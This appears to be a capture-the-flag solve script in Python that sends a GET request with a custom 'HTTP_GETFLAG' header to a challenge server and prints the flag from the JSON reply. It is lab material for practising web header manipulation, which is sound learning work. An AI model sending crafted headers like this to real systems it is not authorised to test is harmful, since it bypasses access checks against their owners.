import requests

url = 'https://challs.aupctf.live/header/'  # Replace with the actual URL of the web application

headers = {
    'HTTP_GETFLAG': 'yes'
}

response = requests.get(url, headers=headers)

# Check if the response was successful (status code 200)    
if response.status_code == 200:
    try:
        # Try to parse the response as JSON
        data = response.json()

        # Access the flag context and print it
        flag = data.get('flag')
        if flag:
            print("Flag: ", flag)
        else:
            print("Flag not found in the response.")
    except ValueError:
        print("Response is not valid JSON.")
else:
    print("Request was not successful. Status code:", response.status_code) 